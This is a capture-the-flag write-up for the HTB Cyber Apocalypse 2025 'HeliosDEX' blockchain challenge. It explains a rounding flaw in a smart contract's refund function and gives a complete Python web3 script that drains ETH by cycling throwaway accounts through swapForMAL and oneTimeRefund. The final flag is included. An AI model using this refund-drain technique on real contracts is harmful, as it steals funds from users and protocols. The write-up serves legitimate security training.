---
title: CTF Writeup ~ Blockchain heliosdex // HTBCyberApocalypse2025
date: 2025-03-27
description: The challenge involves a flawed refund mechanism in the HeliosDEX smart contract. The contract allows swapping ETH for tokens, but when swapping for the MAL token, a rounding vulnerability lets a user receive an unexpectedly high ETH refund by sending only a minimal amount of ETH.
image: images/htb/blockchain_heliosdex_writeup_step1.png
imageAltAttribute: Blockchain heliosdex writeup
tags:
- ctf
- HTBCyberApocalypse2025
- writeups
- blockchain
---


# CHALLENGE NAME: HeliosDEX

# Description:

You stand victorious, panting, over the fallen form of Eldorion. The beast's eternal resilience proved no match for your cunning and skill, adventurer. The path to the city gates of Eldoria now lies open, but the journey is far from over. As you approach, a shimmering structure catches your eye: the HeliosDEX, a decentralized exchange powered by the radiant energy of Helios himself. Whispers tell of travelers using this exchange to amass fortunes, stocking up on rare items and crucial supplies before braving the perils of Eldoria. Perhaps you can use this opportunity to your advantage...

**Points:** 975  
**Difficulty:** Easy
**Category:** Blockchain

---


## Walkthrough:

### **Step 1: Understanding the Problem**
The challenge involves a flawed refund mechanism in the HeliosDEX smart contract. The contract allows swapping ETH for tokens, but when swapping for the MAL token, a rounding vulnerability lets a user receive an unexpectedly high ETH refund by sending only a minimal amount of ETH. However, the contract enforces a one-time refund per address, so to exploit the vulnerability, multiple ephemeral accounts must be used. The overall objective is to aggregate enough ETH (≥20 ETH) in a single persistent account, which then satisfies the challenge’s flag condition.

### **Step 2: Identifying the Best Approach**
The solution involves:
- **Exploiting the Refund:**  
  Call `swapForMAL()` with 1 wei to receive 1 MAL token, then call `oneTimeRefund()` to receive a large ETH refund due to the rounding error.
- **Bypassing the One-Time Refund Limitation:**  
  Since each address can only claim the refund once, create multiple ephemeral accounts that each execute the refund.
- **Aggregating Funds:**  
  Immediately transfer the ETH from each ephemeral account to a persistent aggregator account. Once the aggregator accumulates at least 20 ETH, the flag condition is met.

### **Step 3: Implementing the Algorithm**
The algorithm is implemented in four parts:
1. **Control Service Interaction:**  
   Interact with the control service (using netcat-like commands) to retrieve the connection info (which contains ephemeral account details).
2. **Exploit Cycle:**  
   For each ephemeral account:
   - Call `swapForMAL()` with 1 wei.
   - Approve and then call `oneTimeRefund()` to get the ETH refund.
3. **Aggregation:**  
   Transfer the funds from each ephemeral account (after deducting the gas cost) to a persistent aggregator account.
4. **Flag Retrieval:**  
   Loop until the aggregator’s balance reaches at least 20 ETH, then use the control service to get the flag.

![nc output](/images/htb/blockchain_heliosdex_writeup_step1.png)
_Connecting to challenge server_

### **Step 4: Writing the Python Code**
```python
import socket
import re
import time
from web3 import Web3

### CONFIGURATION ###
CONTROL_HOST = "83.136.249.101"
CONTROL_PORT = 53654
RPC_NODE_URL = "http://83.136.249.101:57493"
TARGET_BALANCE_ETH = 20
# If you have a persistent aggregator address, fill it in here.
# Otherwise, leave the placeholder to use the initial connection info.
AGGREGATOR_ADDRESS = "0xYourAggregatorAddressHere"

### CONTROL SERVICE FUNCTIONS ###
def send_control_command(cmd: str) -> str:
    """Connect to the control service, send a command, and return the response."""
    s = socket.socket()
    s.connect((CONTROL_HOST, CONTROL_PORT))
    time.sleep(0.5)
    try:
        _ = s.recv(1024).decode()
    except Exception:
        pass
    s.sendall(cmd.encode() + b"\n")
    time.sleep(0.5)
    response = s.recv(4096).decode()
    s.close()
    return response

def get_initial_connection_info() -> dict:
    print("[*] Getting initial connection information (option 1)...")
    resp = send_control_command("1")
    print(resp)
    priv_key = re.search(r"Player Private Key\s*:\s*(0x[0-9a-fA-F]+)", resp).group(1)
    player_addr = re.search(r"Player Address\s*:\s*(0x[0-9a-fA-F]+)", resp).group(1)
    target_contract = re.search(r"Target contract\s*:\s*(0x[0-9a-fA-F]+)", resp).group(1)
    setup_contract = re.search(r"Setup contract\s*:\s*(0x[0-9a-fA-F]+)", resp).group(1)
    return {
        "player_private_key": priv_key,
        "player_address": player_addr,
        "target_contract": target_contract,
        "setup_contract": setup_contract
    }

### MAIN AUTOMATION ###
def main():
    w3 = Web3(Web3.HTTPProvider(RPC_NODE_URL))
    if not w3.is_connected():
        print("ERROR: Could not connect to RPC node!")
        return

    # Get the initial connection info and use that account as our persistent aggregator.
    init_info = get_initial_connection_info()
    aggregator_address = w3.to_checksum_address(init_info["player_address"])
    aggregator_private_key = init_info["player_private_key"]
    print(f"[+] Using persistent aggregator address: {aggregator_address}")

    # If an aggregator address was provided in configuration, use that instead.
    global AGGREGATOR_ADDRESS
    if AGGREGATOR_ADDRESS == "0xYourAggregatorAddressHere":
        print("[*] No aggregator provided – using the initial player as aggregator.")
    else:
        aggregator_address = w3.to_checksum_address(AGGREGATOR_ADDRESS)
        # (You must supply the corresponding private key for your aggregator externally.)
        # For this script, we assume you want to use the initial connection info.
        print(f"[+] Using provided aggregator address: {aggregator_address}")
    
    persistent_target = w3.to_checksum_address(init_info["target_contract"])
    persistent_setup = w3.to_checksum_address(init_info["setup_contract"])
    
    # ABI definitions (from the challenge)
    heliosdex_abi = [
        {"inputs": [{"internalType": "uint256", "name": "initialSupplies", "type": "uint256"}],
         "stateMutability": "payable", "type": "constructor"},
        {"inputs": [], "name": "eldorionFang",
         "outputs": [{"internalType": "address", "name": "", "type": "address"}],
         "stateMutability": "view", "type": "function"},
        {"inputs": [], "name": "malakarEssence",
         "outputs": [{"internalType": "address", "name": "", "type": "address"}],
         "stateMutability": "view", "type": "function"},
        {"inputs": [], "name": "heliosLuminaShards",
         "outputs": [{"internalType": "address", "name": "", "type": "address"}],
         "stateMutability": "view", "type": "function"},
        {"inputs": [], "name": "swapForELD",
         "outputs": [], "stateMutability": "payable", "type": "function"},
        {"inputs": [], "name": "swapForMAL",
         "outputs": [], "stateMutability": "payable", "type": "function"},
        {"inputs": [], "name": "swapForHLS",
         "outputs": [], "stateMutability": "payable", "type": "function"},
        {"inputs": [
            {"internalType": "address", "name": "item", "type": "address"},
            {"internalType": "uint256", "name": "amount", "type": "uint256"}
         ],
         "name": "oneTimeRefund", "outputs": [],
         "stateMutability": "nonpayable", "type": "function"}
    ]
    erc20_abi = [
        {"constant": False,
         "inputs": [{"name": "_spender", "type": "address"},
                    {"name": "_value", "type": "uint256"}],
         "name": "approve", "outputs": [{"name": "", "type": "bool"}],
         "type": "function"}
    ]
    
    # Create a persistent instance of the target contract
    target_contract_inst = w3.eth.contract(address=persistent_target, abi=heliosdex_abi)
    mal_token_addr = target_contract_inst.functions.malakarEssence().call()
    mal_token_addr = w3.to_checksum_address(mal_token_addr)
    print(f"[+] Persistent target MAL Token: {mal_token_addr}")
    
    def run_exploit_for_ephemeral(account, private_key):
        """Use the given ephemeral account to run the exploit cycle and transfer funds back to aggregator."""
        acct = w3.to_checksum_address(account)
        w3.eth.default_account = acct
        print(f"[*] Running exploit for ephemeral account: {acct}")
        dex = w3.eth.contract(address=persistent_target, abi=heliosdex_abi)
        mal_token = w3.eth.contract(address=mal_token_addr, abi=erc20_abi)
        
        def send_tx(tx):
            tx['nonce'] = w3.eth.get_transaction_count(acct)
            tx['chainId'] = w3.eth.chain_id
            tx['maxPriorityFeePerGas'] = w3.to_wei(2, 'gwei')
            tx['maxFeePerGas'] = w3.to_wei(12, 'gwei')
            signed = w3.eth.account.sign_transaction(tx, private_key=private_key)
            tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
            receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
            print(f"    [+] TX confirmed in block {receipt.blockNumber}")
            return receipt
        
        # Step 1: swapForMAL with 1 wei
        print("    [*] Calling swapForMAL...")
        tx1 = dex.functions.swapForMAL().build_transaction({
            'from': acct,
            'value': 1,
            'gas': 200000
        })
        send_tx(tx1)
        
        # Step 2: Approve MAL token spending
        print("    [*] Approving MAL token...")
        tx2 = mal_token.functions.approve(persistent_target, 1).build_transaction({
            'from': acct,
            'gas': 100000
        })
        send_tx(tx2)
        
        # Step 3: oneTimeRefund
        print("    [*] Calling oneTimeRefund...")
        tx3 = dex.functions.oneTimeRefund(mal_token_addr, 1).build_transaction({
            'from': acct,
            'gas': 200000
        })
        send_tx(tx3)
        
        # Transfer funds from ephemeral account back to aggregator
        balance = w3.eth.get_balance(acct)
        print(f"    [*] Ephemeral account balance: {w3.from_wei(balance, 'ether')} ETH")
        gas_limit = 21000
        max_fee = w3.to_wei(12, 'gwei')
        gas_cost = gas_limit * max_fee
        if balance > gas_cost:
            value_to_transfer = balance - gas_cost
            print(f"    [*] Transferring {w3.from_wei(value_to_transfer, 'ether')} ETH back to aggregator {aggregator_address}...")
            tx4 = {
                'from': acct,
                'to': aggregator_address,
                'value': value_to_transfer,
                'gas': gas_limit,
                'nonce': w3.eth.get_transaction_count(acct),
                'chainId': w3.eth.chain_id,
                'maxPriorityFeePerGas': w3.to_wei(2, 'gwei'),
                'maxFeePerGas': max_fee
            }
            signed_tx4 = w3.eth.account.sign_transaction(tx4, private_key=private_key)
            tx_hash = w3.eth.send_raw_transaction(signed_tx4.raw_transaction)
            receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
            print(f"    [*] Transfer confirmed in block {receipt.blockNumber}")
        else:
            print("    [*] Insufficient balance for transfer.")
    
    # Main loop: create a new ephemeral account, fund it from aggregator, run exploit, and collect funds
    iteration = 0
    while True:
        iteration += 1
        print(f"\n=== Iteration {iteration} ===")
        # Create a new ephemeral account
        ephemeral_account = w3.eth.account.create()
        ephemeral_address = w3.to_checksum_address(ephemeral_account.address)
        ephemeral_private = ephemeral_account.key.hex()
        print(f"[+] Created ephemeral account: {ephemeral_address}")
        
        # Fund ephemeral account from aggregator (need ~0.05 ETH for gas)
        current_agg_balance = w3.eth.get_balance(aggregator_address)
        if current_agg_balance < w3.to_wei(0.05, 'ether'):
            print("[-] Aggregator doesn't have enough funds to fund ephemeral accounts. Exiting.")
            break
        
        fund_amount = w3.to_wei(0.05, 'ether')
        tx_fund = {
            'from': aggregator_address,
            'to': ephemeral_address,
            'value': fund_amount,
            'gas': 21000,
            'nonce': w3.eth.get_transaction_count(aggregator_address),
            'chainId': w3.eth.chain_id,
            'maxPriorityFeePerGas': w3.to_wei(2, 'gwei'),
            'maxFeePerGas': w3.to_wei(12, 'gwei')
        }
        signed_fund = w3.eth.account.sign_transaction(tx_fund, private_key=aggregator_private_key)
        tx_hash = w3.eth.send_raw_transaction(signed_fund.raw_transaction)
        w3.eth.wait_for_transaction_receipt(tx_hash)
        print(f"[+] Funded ephemeral account {ephemeral_address} with 0.05 ETH")
        
        # Run the exploit cycle using the ephemeral account
        run_exploit_for_ephemeral(ephemeral_address, ephemeral_private)
        
        # Check aggregator balance
        agg_balance = w3.eth.get_balance(aggregator_address)
        agg_balance_eth = w3.from_wei(agg_balance, 'ether')
        print(f"[+] Aggregator ({aggregator_address}) balance: {agg_balance_eth} ETH")
        if agg_balance_eth >= TARGET_BALANCE_ETH:
            print("[*] Target achieved! Aggregator balance is at least 20 ETH.")
            break
        time.sleep(2)
    
    # Finally, request the flag from the control service (option 3)
    print("[*] Requesting flag (option 3)...")
    flag_response = send_control_command("3")
    print("[+] Flag response:")
    print(flag_response)

if __name__ == "__main__":
    main()

```

---

## **Captured Flag:**

![Flag](/images/htb/blockchain_heliosdex_writeup_flag.png)

```zsh
HTB{0n_Heli0s_tr4d3s_a_d3cim4l_f4d3s_and_f0rtun3s_ar3_m4d3}
```